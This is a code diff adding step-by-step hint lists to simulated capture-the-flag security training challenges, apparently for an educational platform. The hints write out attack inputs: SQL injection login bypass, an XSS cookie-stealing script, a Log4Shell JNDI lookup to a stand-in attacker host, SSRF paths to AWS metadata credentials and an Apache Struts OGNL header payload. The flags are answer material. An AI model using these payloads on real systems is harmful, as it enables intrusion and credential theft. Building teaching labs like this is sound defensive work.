@@ -155,6 +155,13 @@ sha256sum received_file.txt
     ctf: {
       scenario: "A compromised AI model is running on this server. Investigate the filesystem and find the hidden flag.",
       hint: "Not all files are visible by default. Try exploring all directories with ls -a.",
+      hints: [
+        "Start by reading the mission briefing. Run: cat README.txt",
+        "Explore the directory structure. Run: ls logs  then  ls config",
+        "Check the log files for clues about the compromise. Run: cat logs/system.log  and  cat logs/ai_model.log",
+        "Some files are hidden from a normal ls. Run: ls -a config  to reveal hidden files (names starting with .)",
+        "You found a hidden file. Read it with: cat config/.hidden",
+      ],
       flag: "FLAG{R0GU3_M0D3L_F0UND}",
       files: {
         "/README.txt": [
@@ -293,6 +300,13 @@ $stmt->execute([$username, $password]);`,
     ctf: {
       scenario: "You've found a login portal for an internal employee database. Standard credentials have been revoked. Use SQL injection to bypass authentication and retrieve the admin flag.",
       hint: "Try entering a single quote in the username field first. Notice the error. Then use comment syntax (--) to bypass the password check.",
+      hints: [
+        "Read the README to see available commands. Run: cat README.txt",
+        "Try logging in normally first. Run: login admin password123  — notice the failure.",
+        "Look at the PHP source code to see how the SQL query is built. Run: cat source/login.php",
+        "A single quote in the username breaks the SQL query. Try: login admin' test",
+        "SQL comments (--) make the database skip the password check. Try: login admin'-- anything",
+      ],
       flag: "FLAG{SQL_1NJ3CT10N_BYPASS3D}",
       files: {
         "/README.txt": [
@@ -462,6 +476,13 @@ $stmt->execute([$username, $password]);`,
     ctf: {
       scenario: "A vulnerable comment system stores user input without sanitization. The admin reviews all comments. Craft an XSS payload to steal the admin session cookie containing the flag.",
       hint: "Try using <script>alert(1)</script> first. Then craft a payload that accesses document.cookie.",
+      hints: [
+        "Read the README to see available commands. Run: cat README.txt",
+        "Test if the app reflects your input. Run: reflect hello world",
+        "Now test if HTML is executed. Run: reflect <b>bold</b>",
+        "Try injecting a script tag to see if JavaScript runs. Run: reflect <script>alert(1)</script>",
+        "The admin views all comments. Submit a payload that accesses document.cookie. Run: submit <script>document.cookie</script>",
+      ],
       flag: "FLAG{XSS_S4MY_W4S_H3R3_2005}",
       files: {
         "/README.txt": [
@@ -638,6 +659,12 @@ if (payload > s) return 0; /* bounds check */`,
     ctf: {
       scenario: "You've connected to a server running OpenSSL 1.0.1f. Use the Heartbeat extension to read beyond the payload boundary and extract the server's private key material.",
       hint: "Send a heartbeat with a short payload but a large claimed length. The server will echo back more bytes than you sent.",
+      hints: [
+        "First establish a TLS connection to the server. Run: connect-tls",
+        "Check the server's OpenSSL version. Run: check-version",
+        "Send a normal heartbeat where the claimed length matches reality. Run: heartbeat HELLO 5",
+        "The bug: the server trusts the claimed length. Claim far more bytes than you actually send. Run: heartbeat HI 10000",
+      ],
       flag: "FLAG{H3RTBL33D_M3M0RY_L34K3D}",
       files: {
         "/README.txt": [
@@ -797,6 +824,11 @@ app.get('/api/user/:id', async (req, res) => {
     ctf: {
       scenario: "You have access to a corporate API as a regular user. The API uses sequential user IDs. Find a way to access admin data.",
       hint: "Your user ID is 9284. What happens if you request /api/user/1 instead of /api/user/me?",
+      hints: [
+        "Read the README for API endpoint details. Run: cat README.txt",
+        "Request your own profile first. Run: api GET /api/user/me",
+        "User IDs are sequential integers starting at 1. Request the first user (admin). Run: api GET /api/user/1",
+      ],
       flag: "FLAG{1D0R_ACC3SS_C0NTR0L_BR0K3N}",
       files: {
         "/README.txt": [
@@ -941,6 +973,14 @@ hash = bcrypt.hash("password123", rounds=12)
     ctf: {
       scenario: "You've obtained a leaked hash database from a compromised server. The admin hash uses unsalted SHA-1. Use the wordlist to crack it.",
       hint: "Use hashcheck <word> to test each password from the wordlist against the admin hash.",
+      hints: [
+        "Read the README to understand the files. Run: cat README.txt",
+        "Check the admin's hash. Run: cat admin_hash.txt",
+        "Read the wordlist to see passwords to try. Run: cat wordlist.txt",
+        "Test each password from the wordlist. Try common ones: hashcheck password  then  hashcheck 123456",
+        "The password is a common English word. Try: hashcheck letmein",
+        "Once you crack it, log in: login admin letmein",
+      ],
       flag: "FLAG{W34K_H4SH_CR4CK3D}",
       files: {
         "/README.txt": [
@@ -1110,6 +1150,12 @@ username: \${j\${::-n}di:ldap://evil.com/a}
     ctf: {
       scenario: "A Java application is logging all user input. The server runs Log4j2 2.14.1. Craft a JNDI payload to trigger remote code execution.",
       hint: "Log4j evaluates ${} expressions in log messages. JNDI supports ldap:// protocol lookups.",
+      hints: [
+        "Check the vulnerable dependencies. Run: check-deps",
+        "Try logging a normal message to see how it works. Run: log hello world",
+        "Log4j evaluates expressions like ${env:PATH} in log messages. Try: log ${env:HOSTNAME}",
+        "JNDI is a Java API for network lookups. Embed a JNDI payload in a logged string. Try: log ${jndi:ldap://attacker.com/a}",
+      ],
       flag: "FLAG{L0G4SH3LL_JNDI_RCE_2021}",
       files: {
         "/README.txt": [
@@ -1267,6 +1313,12 @@ while (true) {
     ctf: {
       scenario: "You're analyzing a network capture from a hospital that was hit by WannaCry. Identify the attack vector and extract the signature from the malicious SMB traffic.",
       hint: "Start with netstat to see active connections, then analyze the suspicious port.",
+      hints: [
+        "Read the incident report. Run: cat README.txt",
+        "Check active network connections. Run: netstat",
+        "You'll see many connections to port 445 (SMB). Read the traffic capture. Run: cat capture/traffic.txt",
+        "Analyze the SMB traffic on port 445 to find the exploit signature. Run: analyze port 445",
+      ],
       flag: "FLAG{W4NN4CRY_SMB_3T3RN4LBU3}",
       files: {
         "/README.txt": [
@@ -1432,6 +1484,13 @@ POST /api/preview
     ctf: {
       scenario: "A web application lets users fetch URLs for previewing. The server runs on AWS EC2. Use SSRF to reach the instance metadata service and steal IAM credentials.",
       hint: "Try fetching http://169.254.169.254/latest/meta-data/ to see what's available.",
+      hints: [
+        "Read the README to understand the fetch command. Run: cat README.txt",
+        "Try fetching a normal external URL. Run: fetch https://example.com",
+        "AWS EC2 instances have a metadata service at a special IP. Run: fetch http://169.254.169.254/latest/meta-data/",
+        "Navigate to the IAM role info. Run: fetch http://169.254.169.254/latest/meta-data/iam/",
+        "Get the actual IAM credentials. Run: fetch http://169.254.169.254/latest/meta-data/security-credentials/",
+      ],
       flag: "FLAG{SSRF_AWS_M3T4D4T4_ST0L3N}",
       files: {
         "/README.txt": [
@@ -1579,6 +1638,12 @@ Content-Type: %{
     ctf: {
       scenario: "You've identified a server running a vulnerable version of Apache Struts 2. Exploit the Content-Type header OGNL injection to achieve remote code execution.",
       hint: "The OGNL expression goes in the Content-Type header. Use send-request with an OGNL payload containing %{ or #context.",
+      hints: [
+        "Check the server version. Run: check-version",
+        "Send a normal request to see the baseline response. Run: send-request application/json",
+        "The vulnerability is OGNL injection in the Content-Type header. OGNL uses %{ } syntax. Try: send-request %{1+1}",
+        "Use %{} with OGNL to execute code. Try: send-request %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Hack','yes')}",
+      ],
       flag: "FLAG{3QU1F4X_STR2_RCE_2017}",
       files: {
         "/README.txt": [
@@ -1738,6 +1803,14 @@ mongod --bind_ip 127.0.0.1 --auth
     ctf: {
       scenario: "You've found a MongoDB instance on the target network. It appears to be using default configuration. Investigate the filesystem for connection details, then access the database.",
       hint: "Look for hidden config files. MongoDB's default port is 27017 and older versions require no credentials.",
+      hints: [
+        "Read the README first. Run: cat README.txt",
+        "Explore the etc directory. Run: ls etc",
+        "There may be hidden files. Run: ls -a etc  (files starting with . are hidden)",
+        "Read the hidden environment file. Run: cat etc/.env  — look for the database config.",
+        "MongoDB has no auth enabled. Connect directly. Run: mongo connect localhost:27017",
+        "Query the database. Run: mongo find users",
+      ],
       flag: "FLAG{M0NG0DB_N0_4UTH_3XP0S3D}",
       files: {
         "/README.txt": [
